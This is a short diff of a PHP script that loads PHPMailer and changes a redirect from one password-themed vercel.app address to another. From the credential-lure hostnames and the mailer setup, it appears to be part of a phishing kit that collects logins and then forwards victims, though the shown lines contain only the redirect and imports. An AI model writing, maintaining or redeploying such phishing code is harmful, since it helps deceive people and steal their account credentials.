@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://password-aprove-section.vercel.app/");
+header("Location: https://re-pass-support.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
